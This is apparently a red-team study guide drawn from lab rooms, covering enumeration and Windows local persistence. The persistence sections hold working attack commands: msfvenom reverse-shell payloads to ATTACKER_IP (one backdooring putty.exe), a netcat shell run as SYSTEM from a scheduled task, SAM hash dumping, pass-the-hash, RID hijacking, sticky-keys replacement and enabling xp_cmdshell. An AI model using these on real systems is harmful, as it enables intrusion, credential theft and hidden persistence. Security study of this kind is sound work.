## The Lay of the Land

### --------------------------------- Network Infrastructure -----------------------------------

#### **Network Infrastructure**

- **Network Segmentation:** Divides a network into smaller subnets to improve security and management.
- **VLAN:** Separates devices into logical networks. Hosts in different VLANs are isolated by default.

[Network Fundamentals](https://tryhackme.com/module/network-fundamentals?utm_source=chatgpt.com)

#### **Internal Networks**

- Private networks used inside an organization.
- Provide internal services: DNS, web, email, etc.
- Segmentation controls traffic, improves performance and security.

<img width="912" height="567" alt="image" src="https://github.com/user-attachments/assets/5f8653a1-4b48-43b3-9280-4e2d37d4b150" />

#### **DMZ (Demilitarized Zone)**

- Network between the public Internet and internal network.
- Hosts public-facing services like websites, DNS, FTP, VPN.
- Protects internal networks from untrusted traffic.

<img width="850" height="674" alt="image" src="https://github.com/user-attachments/assets/39b9e66b-be79-40ba-a51d-fd1ed02fb517" />

#### **Network Enumeration**

Used to discover network details after gaining initial access.

**Check connections and open ports:**

```
netstat -na
```

**Check ARP table:**

```
arp -a
```

- ARP table = IP addresses and corresponding MAC addresses of devices recently communicated with.
- Helps identify other devices on the network.

#### **Internal Network Services**

- Private services accessible only from internal networks.
- Examples: DNS, web servers, custom applications.

**Remember:** Enumerate the network to understand the environment and identify possible paths for lateral movement and privilege escalation.


### --------------------------------- Active Directory (AD) environment -----------------------------------

#### **Active Directory (AD)**

- Windows directory service for centralized **authentication and authorization**.
- Stores information about users, computers, printers, groups, permissions, etc.


<img width="946" height="839" alt="image" src="https://github.com/user-attachments/assets/a86b3df5-01db-4583-b85e-3bb11e193cf0" />

#### **Main AD Components**

- **Domain Controller (DC):** Windows server that manages the AD domain.
- **Organizational Unit (OU):** Container that organizes AD objects hierarchically.
- **AD Objects:** Users, computers, groups, printers, GPOs, etc.
- **AD Domain:** Collection of AD objects managed together.
- **AD Forest:** Collection of domains that trust each other.
- **Service Accounts:** Accounts used by services.
- **Domain Administrators:** Users with high-level domain privileges.

<img width="1379" height="744" alt="image" src="https://github.com/user-attachments/assets/dc3b75c1-bbfc-4aa6-a078-4d03254d5367" />


<img width="1000" height="597" alt="image" src="https://github.com/user-attachments/assets/055f55dc-c0af-4bac-bd9b-8da797ac4991" />

#### **Important AD Objects**

- **Users:** Can authenticate to domain machines.
- **Computers:** Special user accounts representing machines.
- **GPOs:** Policies applied to AD objects.

[Active Directory Basics – THM](https://tryhackme.com/room/winadbasics?utm_source=chatgpt.com)

#### **Check if a Machine Is Domain-Joined**

```
systeminfo | findstr Domain
```

- Shows the AD domain name.
- Helps identify whether the machine belongs to an AD environment.

**Remember:** AD enumeration helps discover users, computers, permissions and domain information for lateral movement.


### --------------------------------- Users and Groups Management -----------------------------------

#### **AD Users & Groups**

**Account Types**

- **Local Users:** Manage the local machine, not AD.
- **Domain Users:** Access AD resources and services.
- **Managed Service Accounts:** Accounts used to manage AD services.
- **Domain Admins:** Control users, groups, permissions and AD configurations.

#### **Important AD Groups**

| Group                   | Permission                  |
| ----------------------- | --------------------------- |
| `BUILTIN\Administrator` | Local admin on DC           |
| `Domain Admins`         | Control domain resources    |
| `Enterprise Admins`     | Forest-wide administration  |
| `Schema Admins`         | Modify AD schema            |
| `Server Operators`      | Manage domain servers       |
| `Account Operators`     | Manage non-privileged users |

#### **AD User Enumeration**

Get all AD users:

```
Get-ADUser -Filter *
```

Get users from a specific OU/container:

```
Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM"
```

#### **Distinguished Name (DN)**

- Unique path identifying an AD object.
- Contains:
  - `CN` = Common Name
  - `OU` = Organizational Unit
  - `DC` = Domain Component

Example:

```
CN=User1,CN=Users,DC=thmredteam,DC=com
```

[LDAP DN Structure](https://www.ietf.org/rfc/rfc2253.txt?utm_source=chatgpt.com)

**Remember:** `Get-ADUser -Filter *` lists users; `-SearchBase` limits the search location.


### --------------------------------- Host Security Solution #1 -----------------------------------

#### **Host Security Solutions**

Security software that monitors and protects a computer.

Examples:

- Antivirus (AV)
- Windows Defender
- Host-based Firewall
- Security Event Logging
- HIDS/HIPS
- EDR

#### **1. Antivirus (AV)**

Detects and prevents malware.

**Detection methods:**

| Method          | Meaning                                   |
| --------------- | ----------------------------------------- |
| Signature-based | Matches known malware signatures          |
| Heuristic-based | Analyzes suspicious code/properties       |
| Behavior-based  | Detects suspicious application activities |

**Find installed antivirus:**

```
wmic /namespace:\\root\securitycenter2 path antivirusproduct
```

```
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

#### **2. Windows Defender**

Three modes:

- **Active:** Primary antivirus.
- **Passive:** Secondary antivirus when third-party AV is installed.
- **Disabled:** Protection turned off.

Check Defender service:

```
Get-Service WinDefend
```

Check real-time protection:

```
Get-MpComputerStatus | select RealTimeProtectionEnabled
```

#### **3. Host-Based Firewall**

- Controls inbound and outbound network traffic.
- Allows or blocks network connections.
- Can block ports, ICMP and other traffic.

Check firewall profiles:

```
Get-NetFirewallProfile | Format-Table Name, Enabled
```

Check firewall rules:

```
Get-NetFirewallRule | select DisplayName, Enabled, Description
```

Test a port connection:

```
Test-NetConnection -ComputerName 127.0.0.1 -Port 80
```

Alternative using TcpClient:

```
(New-Object System.Net.Sockets.TcpClient("127.0.0.1", "80")).Connected
```

**Remember:** Enumerate AV, Defender and firewall configurations to understand the host's security protections.


### --------------------------------- Host Security Solution #2 -----------------------------------

#### **1. Security Event Logging**

- Windows records system activities in **event logs**.
- Used to monitor and investigate security incidents.
- Logs include Application, System, Security, DNS, etc.
- Installed services can sometimes be identified from available logs.

List event logs:

```
Get-EventLog -List
```

[Microsoft Documentation](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?utm_source=chatgpt.com)

#### **2. Sysmon (System Monitor)**

- Microsoft Sysinternals tool.
- Not installed by default.
- Records important system activities:
  - Process creation/termination
  - Network connections
  - File modifications
  - Process and memory access

[Sysmon Documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon?utm_source=chatgpt.com)

**Check Sysmon:**

```
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
```

```
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
```

```
Get-Service | where-object {$_.DisplayName -like "*sysm*"}
```

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
```

Find Sysmon configuration:

```
findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
```

[THM Sysmon Room](https://tryhackme.com/room/sysmon?utm_source=chatgpt.com)

#### **3. HIDS / HIPS**

| Solution | Purpose                                    |
| -------- | ------------------------------------------ |
| HIDS     | Detects suspicious host activities         |
| HIPS     | Detects and prevents suspicious activities |

**IDS detection methods:**

- Signature-based = Matches known attack signatures.
- Anomaly-based = Detects unusual activity.

HIPS can monitor logs, processes and system resources.

#### **4. EDR (Endpoint Detection and Response)**

- Next-generation endpoint security solution.
- Monitors system, network and process activities in real time.
- Detects malware, exploits and ransomware.
- Records events for investigation.

**Examples:**

- Cylance
- CrowdStrike
- Symantec
- SentinelOne

**EDR enumeration tools:**

- [Invoke-EDRChecker](https://github.com/PwnDexter/Invoke-EDRChecker?utm_source=chatgpt.com)
- [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker?utm_source=chatgpt.com)

**Remember:**

- Event Logs = Record activities.
- Sysmon = Detailed activity monitoring.
- HIDS = Detect threats.
- HIPS = Detect + Prevent.
- EDR = Monitor + Detect + Investigate endpoint threats.


### --------------------------------- Network Security Solutions -----------------------------------

#### **Network Security Solutions**

Software or hardware that monitors, detects and prevents network attacks.

Main types:

- Network Firewall
- SIEM
- NIDS/NIPS

#### **1. Network Firewall**

- First checkpoint for incoming network traffic.
- Allows or blocks traffic based on rules and policies.
- Separates internal and external networks.

**Types:**

- Packet-filtering Firewall
- Proxy Firewall
- NAT Firewall
- Web Application Firewall (WAF)

#### **2. SIEM (Security Information and Event Management)**

- Collects and analyzes logs from the entire network.
- Detects suspicious activities and security threats.
- Alerts administrators about attacks.

**Main functions:**

- Log management
- Event analytics
- Security alerts
- Compliance reporting

**Detects:** Insider threats, phishing, web attacks, DDoS, data exfiltration.

**Examples:**

- Splunk
- LogRhythm
- SolarWinds
- Datadog

#### **3. NIDS / NIPS**

Monitors network traffic and detects threats.

| Solution | Function                              |
| -------- | ------------------------------------- |
| NIDS     | Detects suspicious traffic and alerts |
| NIPS     | Detects and blocks suspicious traffic |

**Examples:**

- Palo Alto Networks
- Cisco Next-Generation
- McAfee NSP
- Trend Micro TippingPoint
- Suricata

[IDS vs IPS](https://geekflare.com/ids-vs-ips-network-security-solutions/?utm_source=chatgpt.com)

**Remember:**

- Firewall = Filters traffic.
- SIEM = Collects and analyzes logs.
- NIDS = Detects network threats.
- NIPS = Detects and blocks network threats.


### --------------------------------- Applications and Services -----------------------------------

#### **Applications and Services**

Enumerate applications, processes, services, shared resources and internal network services.

#### **1. Installed Applications**

List installed applications and versions:

```
wmic product get name,version
```

Find hidden files and directories:

```
Get-ChildItem -Hidden -Path C:\Users\USERNAME\Desktop\
```

**Why?** Find vulnerable software, credentials and misconfigurations.

#### **2. Services and Processes**

List running services:

```
net start
```

Find service executable path:

```
wmic service where "name like 'THM Demo'" get Name,PathName
```

Find process details:

```
Get-Process -Name thm-demo
```

Find listening ports for a process ID:

```
netstat -noa | findstr "LISTENING" | findstr "PID"
```

- Services may have misconfigurations that allow privilege escalation.
- Custom applications can contain security weaknesses.

[MITRE Process Discovery](https://attack.mitre.org/techniques/T1057/?utm_source=chatgpt.com)

[Core Windows Processes – THM](https://tryhackme.com/room/btwindowsinternals?utm_source=chatgpt.com)

#### **3. File and Printer Sharing**

- Shared files and printers may expose sensitive information.
- Misconfigured permissions can allow unauthorized access.

[Printer Hacking 101](https://tryhackme.com/room/printerhacking101?utm_source=chatgpt.com)

#### **4. Internal Services**

Common services:

- DNS
- Email
- Network File Share
- Web Applications
- Databases

[Network Services](https://tryhackme.com/room/networkservices?utm_source=chatgpt.com)

[Network Services 2](https://tryhackme.com/room/networkservices2?utm_source=chatgpt.com)

#### **5. DNS Zone Transfer**

Used to retrieve DNS records from a DNS server.

Start:

```
nslookup.exe
```

Select DNS server:

```
server MACHINE_IP
```

Request zone transfer:

```
ls -d thmredteam.com
```

- `server` = Select DNS server.
- `ls -d` = Request all domain records.

**Remember:** Enumerate applications, services, processes, ports and DNS records to understand the internal environment.




## Enumeration

### --------------------------------- Linux Enumeration -----------------------------------

#### **Linux Enumeration**

Four main areas:

1. System
2. Users
3. Networking
4. Running Services

#### **1. System Enumeration**

**OS information:**

```
ls /etc/*-release
cat /etc/os-release
hostname
```

**Important files:**

| File          | Information                   |
| ------------- | ----------------------------- |
| `/etc/passwd` | User accounts                 |
| `/etc/group`  | Groups                        |
| `/etc/shadow` | Password hashes (root access) |
| `/var/mail/`  | User emails                   |

```
cat /etc/passwd
cat /etc/group
sudo cat /etc/shadow
ls -lh /var/mail/
```

**Installed applications:**

```
ls -lh /usr/bin/
ls -lh /sbin/
rpm -qa       # RPM-based
dpkg -l       # Debian-based
```

#### **2. User Enumeration**

| Command   | Purpose                              |
| --------- | ------------------------------------ |
| `who`     | Currently logged-in users            |
| `whoami`  | Current effective username           |
| `w`       | Logged-in users and their activities |
| `id`      | User/group IDs and memberships       |
| `last`    | Previous login history               |
| `sudo -l` | Commands allowed with sudo           |

#### **3. Network Enumeration**

**IP and interfaces:**

```
ip address show
ip a s
ifconfig -a
```

**DNS server:**

```
cat /etc/resolv.conf
```

**Netstat options:**

| Option | Meaning              |
| ------ | -------------------- |
| `-a`   | All sockets          |
| `-l`   | Listening sockets    |
| `-n`   | Numeric addresses    |
| `-t`   | TCP                  |
| `-u`   | UDP                  |
| `-x`   | UNIX sockets         |
| `-p`   | PID and program name |

**Listening TCP ports:**

```
sudo netstat -plt
```

**All TCP/UDP connections:**

```
sudo netstat -atupn
```

**List network connections:**

```
sudo lsof -i
```

**Check specific port:**

```
sudo lsof -i :25
```

#### **4. Running Services / Processes**

**List all processes:**

```
ps -e
ps -ef
ps aux
```

**Process tree:**

```
ps axf
```

**Filter processes:**

```
ps -ef | grep peter
```

**Useful&#x20;**`ps`**&#x20;options:**

| Option | Meaning              |
| ------ | -------------------- |
| `-e`   | All processes        |
| `-f`   | Full format          |
| `-j`   | Jobs format          |
| `-l`   | Long format          |
| `-u`   | User-oriented format |

**Remember:**

- `System` = OS, files, installed packages.
- `Users` = Accounts, groups, login history, sudo.
- `Networking` = IP, DNS, ports, connections.
- `Running Services` = Processes and their activities.


### --------------------------------- Windows Enumeration -----------------------------------

#### **1. System Enumeration**

| Command                                | Purpose                               |
| -------------------------------------- | ------------------------------------- |
| `systeminfo`                           | OS version, build, hotfixes, hardware |
| `wmic qfe get Caption,Description`     | Installed Windows updates             |
| `net start`                            | Running services                      |
| `wmic product get name,version,vendor` | Installed applications                |

#### **2. User Enumeration**

| Command                         | Purpose                           |
| ------------------------------- | --------------------------------- |
| `whoami`                        | Current user                      |
| `whoami /priv`                  | User privileges                   |
| `whoami /groups`                | User's groups                     |
| `net user`                      | All local users                   |
| `net group`                     | Domain groups (Domain Controller) |
| `net localgroup`                | Local groups                      |
| `net localgroup administrators` | Local administrators              |
| `net accounts`                  | Local password policy             |
| `net accounts /domain`          | Domain password policy            |

#### **3. Network Enumeration**

| Command         | Purpose                                                |
| --------------- | ------------------------------------------------------ |
| `ipconfig`      | IP, subnet mask, gateway                               |
| `ipconfig /all` | Full network configuration, including DNS              |
| `netstat -abno` | Listening ports, active connections, binaries and PIDs |
| `arp -a`        | Recently communicating LAN devices (IP and MAC)        |

**Netstat options:**

- `-a` — All listening ports and active connections.
- `-b` — Executable using the connection.
- `-n` — Numeric IP addresses and ports.
- `-o` — Process ID (PID).

**Important:** `netstat` checks connections locally without generating network scanning traffic. Port scanning may miss ports blocked by a firewall.

#### **4. Lab Connection**

```
ssh user@MACHINE_IP
```

- Username: `user`
- Password: `THM33$$88`

**Remember:** Windows enumeration covers four areas: **System, Users, Networking, and Running Services.**


### --------------------------------- DNS, SMB, and SNMP -----------------------------------

#### **1. DNS Enumeration**

- DNS records include A, AAAA, CNAME, TXT.
- **Zone transfer (AXFR):** Attempts to copy all DNS records and discover hidden hosts.
- It works only if the DNS server allows it.

```
dig -t AXFR DOMAIN_NAME @DNS_SERVER
```

- `-t AXFR` — Request zone transfer.
- `@DNS_SERVER` — DNS server to query.

Links:

- [DNS in Detail](https://tryhackme.com/room/dnsindetail?utm_source=chatgpt.com)
- [Passive Reconnaissance](https://tryhackme.com/room/passiverecon?utm_source=chatgpt.com)

#### **2. SMB Enumeration**

- SMB provides shared access to files and printers.
- `net share` — Lists shared folders and their paths.

```
net share
```

Check for interesting shares containing sensitive files.

#### **3. SNMP Enumeration**

- SNMP collects information about network devices (servers, printers, etc.).
- It may expose useful system and network information.
- `snmpcheck` queries SNMP using a community string.

**AttackBox:**

```
/opt/snmpcheck/snmpcheck.rb TARGET_IP -c COMMUNITY_STRING
```

If `snmp` library is missing:

```
sudo gem install snmp
ruby /opt/snmpcheck/snmpcheck.rb TARGET_IP -c public | more
```

**Kali:**

```
snmpcheck -t TARGET_IP -c public
```

**Install manually:**

```
git clone https://gitlab.com/kalilinux/packages/snmpcheck.git
cd snmpcheck/
gem install snmp
chmod +x snmpcheck-1.9.rb
```

**Remember:**

- DNS → Discover hosts through DNS records.
- SMB → Discover shared files and folders.
- SNMP → Gather information about network devices.


### --------------------------------- More Tools for Windows -----------------------------------

#### **1. Sysinternals Suite**

A collection of Windows GUI and command-line tools for system enumeration.

| Tool             | Purpose                              |
| ---------------- | ------------------------------------ |
| Process Explorer | Processes, open files, registry keys |
| Process Monitor  | Monitor files, processes, Registry   |
| PsList           | Process information                  |
| PsLoggedOn       | Logged-in users                      |

- [Sysinternals Utilities](https://docs.microsoft.com/en-us/sysinternals/downloads/?utm_source=chatgpt.com)
- [THM Sysinternals Room](https://tryhackme.com/room/btsysinternalssg?utm_source=chatgpt.com)

#### **2. Process Hacker**

GUI tool for detailed process and system monitoring.

- Shows running processes and network connections.
- Monitors CPU, memory, disk and network usage.
- [Download](https://processhacker.sourceforge.io/?utm_source=chatgpt.com)

#### **3. GhostPack Seatbelt**

- C# tool for Windows system enumeration.
- Part of the GhostPack collection.
- No official precompiled binary; compile using Microsoft Visual Studio.

[GitHub – Seatbelt](https://github.com/GhostPack/Seatbelt?utm_source=chatgpt.com)




## Windows Privilege Escalation

### [WPE](https://github.com/OxL3on/HackTheBox/tree/main/CPTS/Windows%20Privilege%20Escalation)




## Windows Local Persistence

### --------------------------------- Introduction -----------------------------------

**Persistence** means creating another way to regain access to a compromised Windows host without exploiting it again.

#### **Why Persistence?**

- **Unstable exploits:** Exploitation may crash the vulnerable process, giving only one chance.
- **Hard-to-repeat access:** Phishing or other initial access methods may be difficult to repeat.
- **Blue team response:** Vulnerabilities may get patched after detection, removing the original access.

**Important:** Reusing admin password hashes is risky because credentials can be changed. Other persistence methods can provide alternative access.

**Remember:** Initial access gets you in; persistence helps you get back in.


### --------------------------------- Tampering With Unprivileged Accounts -----------------------------------

#### **1. Assign Group Memberships**

**Direct method:** Add an unprivileged user to the Administrators group.

```
net localgroup administrators thmuser0 /add
```

**Backup Operators method:**

- `Backup Operators` can read/write files while bypassing DACL permissions.
- Important privileges:
  - `SeBackupPrivilege` — Read any file.
  - `SeRestorePrivilege` — Write any file.

```
net localgroup "Backup Operators" thmuser1 /add
net localgroup "Remote Management Users" thmuser1 /add
```

#### **2. UAC Remote Restriction**

- `LocalAccountTokenFilterPolicy` strips administrative privileges from local accounts during remote login.
- Set it to `1` to prevent this filtering.

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

#### **3. SAM and SYSTEM Hash Extraction**

SAM stores local account password hashes. SYSTEM contains information needed to decrypt them.

```
reg save hklm\system system.bak
reg save hklm\sam sam.bak
```

Download both files using Evil-WinRM:

```
download system.bak
download sam.bak
```

Extract hashes:

```
python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

Pass-the-Hash using Administrator's NTLM hash:

```
evil-winrm -i MACHINE_IP -u Administrator -H NTLM_HASH
```

#### **4. Assign Special Privileges Without Group Membership**

Use `secedit` to assign privileges directly to a user.

```
secedit /export /cfg config.inf
```

Add the user to the `SeBackupPrivilege` and `SeRestorePrivilege` entries in `config.inf`.

```
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
```

**WinRM Security Descriptor:**

A security descriptor controls access to a system resource, similar to an ACL.

```
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

Use the GUI to grant the user permission to connect to WinRM.

**Remember:** A user can have powerful privileges without belonging to an administrative group.

#### **5. RID Hijacking**

- RID (Relative Identifier) identifies a user.
- Administrator's default RID = `500`.
- Normal users usually have RID `>= 1000`.
- RID is the last part of a user's SID.
- Changing a user's RID to `500` can make Windows treat that user as Administrator.

Find user SIDs:

```
wmic useraccount get name,sid
```

Run Registry Editor as SYSTEM:

```
C:\tools\pstools\PsExec64.exe -i -s regedit
```

Registry location:

```
HKLM\SAM\SAM\Domains\Account\Users\
```

- Find the user's key using their RID in hexadecimal.
- Example: `1010` = `0x3F2`.
- Edit the `F` value at offset `0x30`.
- Replace the user's RID with Administrator's RID.
- RID uses **little-endian** byte order:
  - `500` = `0x01F4`
  - Stored as `F401`.

The user receives Administrator-level access after logging in again.

**Key concepts to remember**

| Technique                 | Main idea                                 |
| ------------------------- | ----------------------------------------- |
| Administrators group      | Give user admin membership                |
| Backup Operators          | Read/write protected files                |
| Special privileges        | Assign backup/restore privileges directly |
| WinRM security descriptor | Allow remote management access            |
| RID Hijacking             | Make a user use Administrator's RID       |


### --------------------------------- Backdooring Files -----------------------------------

**File backdooring** means modifying files users regularly open so additional code runs while the original file still works normally.

Three techniques:

#### **1. Executable Files (.exe)**

- Modify a commonly used executable, such as PuTTY.
- `msfvenom` can inject an additional payload while keeping the original program functional.

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

- `-x` — Original executable.
- `-k` — Keep original executable running.
- `-p` — Payload.
- `-b` — Bad characters.
- `-o` — Output file.

#### **2. Shortcut Hijacking (.lnk)**

- Change a shortcut's target to a script.
- The script runs additional code, then opens the original program.
- Keep the original icon to avoid visible changes.
- `-WindowStyle hidden` hides the PowerShell window.

**Example shortcut target:**

```
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

**Concept:** Original shortcut → Script → Original application.

#### **3. File Association Hijacking**

- Windows stores file associations in the Registry.
- Registry location:

```
HKLM\Software\Classes\
```

- `.txt` identifies the file extension.
- `ProgID` identifies the associated application.
- `shell\open\command` stores the command used to open the file.

Example normal command:

```
%SystemRoot%\system32\NOTEPAD.EXE %1
```

- `%1` represents the opened file's path.
- PowerShell uses `$args[0]` to access the file argument.

**Concept:** Modify the file handler so additional code runs while the original application still opens the file.

**Quick Revision**

| Technique                  | What is modified?      |
| -------------------------- | ---------------------- |
| Executable backdooring     | `.exe` file            |
| Shortcut hijacking         | `.lnk` shortcut target |
| File association hijacking | Registry file handler  |

**Remember:** Persistence through files relies on users regularly opening the modified executable, shortcut, or file type.


### --------------------------------- Abusing Services -----------------------------------

#### **Abusing Windows Services**

**Windows services** are background executables that can run automatically when Windows starts. They can be abused for persistence in two ways:

1. Create a new service.
2. Modify an existing service.

#### **1. Creating a New Service**

Create and start a service:

```
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

- `binPath` — Program/command executed by the service.
- `start= auto` — Starts automatically with Windows.
- `sc.exe start` — Starts the service.

**Important:** Keep a space after each `=`.

Create a Windows service-compatible executable using MSFVenom:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

Create service using that executable:

```
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

#### **2. Modifying Existing Services**

Reusing an existing service can avoid creating a new service entry.

**List all services:**

```
sc.exe query state=all
```

**Check service configuration:**

```
sc.exe qc THMService3
```

Important configuration fields:

| Field                | Purpose                     |
| -------------------- | --------------------------- |
| `BINARY_PATH_NAME`   | Executable path             |
| `START_TYPE`         | Automatic or manual startup |
| `SERVICE_START_NAME` | Account running the service |

\- `LocalSystem` provides SYSTEM-level privileges.

Create a service-compatible payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

Modify existing service:

```
sc.exe config THMService3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

Verify configuration:

```
sc.exe qc THMService3
```

**Quick Revision**

| Technique           | Main command             |
| ------------------- | ------------------------ |
| Create service      | `sc.exe create`          |
| Start service       | `sc.exe start`           |
| List services       | `sc.exe query state=all` |
| Check configuration | `sc.exe qc`              |
| Modify service      | `sc.exe config`          |

**Remember:** For service persistence, understand the executable path, startup type, and service account.


### --------------------------------- Abusing Scheduled Tasks -----------------------------------

**Scheduled Tasks** allow Windows to execute programs automatically at specific times, repeatedly, or when system events occur.

Windows uses `schtasks` to manage scheduled tasks.

#### **1. Creating a Scheduled Task**

Example: Create a task that runs every minute.

```
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

**Important options:**

| Option       | Meaning                    |
| ------------ | -------------------------- |
| `/create`    | Create task                |
| `/sc`        | Schedule type              |
| `/mo 1`      | Every 1 minute             |
| `/tn`        | Task name                  |
| `/tr`        | Program/command to execute |
| `/ru SYSTEM` | Run as SYSTEM              |

**Check task:**

```
schtasks /query /tn THM-TaskBackdoor
```

#### **2. Hiding Scheduled Tasks**

- Each scheduled task has a Security Descriptor (SD).
- SD controls which users can access/query the task.
- Task security descriptors are stored in:

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
```

- Each task has an `SD` registry value.
- Removing `SD` makes the task inaccessible to users, including administrators.

Open Registry Editor as SYSTEM:

```
C:\tools\pstools\PsExec64.exe -s -i regedit
```

Then locate the task's registry key and delete its `SD` value.

**Remember:** The task may continue running even when users cannot query it.

#### **Quick Revision**

| Concept                  | Purpose                    |
| ------------------------ | -------------------------- |
| `schtasks /create`       | Create scheduled task      |
| `/sc`                    | Set schedule               |
| `/ru SYSTEM`             | Run with SYSTEM privileges |
| `schtasks /query`        | Check scheduled tasks      |
| Security Descriptor (SD) | Controls task access       |

[Microsoft – schtasks documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks?utm_source=chatgpt.com)


### --------------------------------- Logon Triggered Persistence -----------------------------------

**Logon persistence** means configuring Windows to execute a program or script whenever a user logs in.

There are four main methods:

#### **1. Startup Folder**

Each user has a separate Startup folder:

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

For all users:

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

- Programs placed in these folders run when the user logs in.
- User Startup folder → Current user only.
- Common Startup folder → All users.

#### **2. Run / RunOnce Registry Keys**

Registry locations:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

| Key       | Behavior     |
| --------- | ------------ |
| `HKCU`    | Current user |
| `HKLM`    | All users    |
| `Run`     | Every login  |
| `RunOnce` | Only once    |

#### **3. Winlogon**

Winlogon manages the Windows login process.

Registry location:

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
```

Important values:

- `Userinit` → Runs `userinit.exe` to load user profile settings.
- `shell` → Runs the Windows shell, usually `explorer.exe`.

**Remember:** Both values are important for logon persistence.

#### **4. Logon Scripts**

- `userinit.exe` checks the `UserInitMprLogonScript` environment variable during login.
- This variable can specify a logon script.
- Each user has separate environment variables.

Registry location:

```
HKCU\Environment
```

Value:

```
UserInitMprLogonScript
```

**Important:** This method applies only to the current user because there is no equivalent HKLM key.

#### **Quick Revision**

| Method         | Location                     | Scope        |
| -------------- | ---------------------------- | ------------ |
| Startup Folder | User Startup folder          | Current user |
| Common Startup | `C:\ProgramData\...\StartUp` | All users    |
| Run / RunOnce  | HKCU                         | Current user |
| Run / RunOnce  | HKLM                         | All users    |
| Winlogon       | HKLM Winlogon                | System-wide  |
| Logon Script   | HKCU Environment             | Current user |

**Remember:** All four techniques trigger execution during user login.


### --------------------------------- Backdooring the Login Screen / RDP -----------------------------------

Windows accessibility features can be abused to open a command prompt from the login screen without entering credentials.

Two methods:

#### **1. Sticky Keys (**`sethc.exe`**)**

- Sticky Keys allows key combinations to be pressed sequentially.
- Pressing `SHIFT` five times activates Sticky Keys.
- Windows executes:

```
C:\Windows\System32\sethc.exe
```

- Replacing `sethc.exe` with `cmd.exe` opens CMD from the login screen.
- The resulting CMD runs with **SYSTEM privileges**.

Important commands:

```
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
```

#### **2. Utilman (**`Utilman.exe`**)**

- Utilman provides Ease of Access options on the Windows login screen.
- Clicking the Ease of Access button executes:

```
C:\Windows\System32\Utilman.exe
```

\- Replacing it with `cmd.exe` opens CMD from the login screen with **SYSTEM privileges**.

Important commands:

```
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
```

#### **Quick Revision**

| Method      | Trigger              | Executable    |
| ----------- | -------------------- | ------------- |
| Sticky Keys | Press SHIFT 5 times  | `sethc.exe`   |
| Utilman     | Click Ease of Access | `Utilman.exe` |

**Remember:**

- `takeown` → Take file ownership.
- `icacls` → Modify file permissions.
- Both techniques abuse accessibility executables to obtain SYSTEM-level CMD access before login.


### --------------------------------- Persisting Through Existing Services -----------------------------------

#### **Persisting Through Existing Services**

Persistence can be established by abusing existing applications and services that execute user-controlled code.

Two methods covered:

#### **1. Web Shells (IIS)**

- Upload an ASP.NET web shell into the IIS webroot.
- Default IIS webroot:

```
C:\inetpub\wwwroot
```

- Default IIS application pool identity: `iis apppool\defaultapppool`.
- This account may have `SeImpersonatePrivilege`, which can be relevant to Windows privilege escalation.

Useful references:

- [ASP.NET Web Shell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx?utm_source=chatgpt.com)
- [Windows PrivEsc Room](https://tryhackme.com/room/windowsprivesc20?utm_source=chatgpt.com)

**Detection:** Blue teams may monitor web directories for unexpected file changes.

#### **2. MSSQL Backdoor (Triggers)**

**Important concepts:**

- **Trigger:** Executes automatically when a database event occurs.
- `xp_cmdshell`**:** MSSQL stored procedure that executes Windows commands.
- `sa`**:** Default SQL Server administrator login.
- `IMPERSONATE`**:** Allows a database principal to act as another login.

**Enable advanced options and&#x20;**`xp_cmdshell`**:**

```
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

**Trigger concept:**

- Create a trigger on `HRDB.dbo.Employees`.
- Trigger event: `INSERT`.
- The trigger executes when a new employee record is inserted.
- It can invoke `xp_cmdshell` to execute system commands.

**Remember:** A database action can trigger code execution on the underlying Windows host.

#### **Quick Revision**

| Technique                | Persistence mechanism                                |
| ------------------------ | ---------------------------------------------------- |
| Web Shell                | Web server executes uploaded server-side file        |
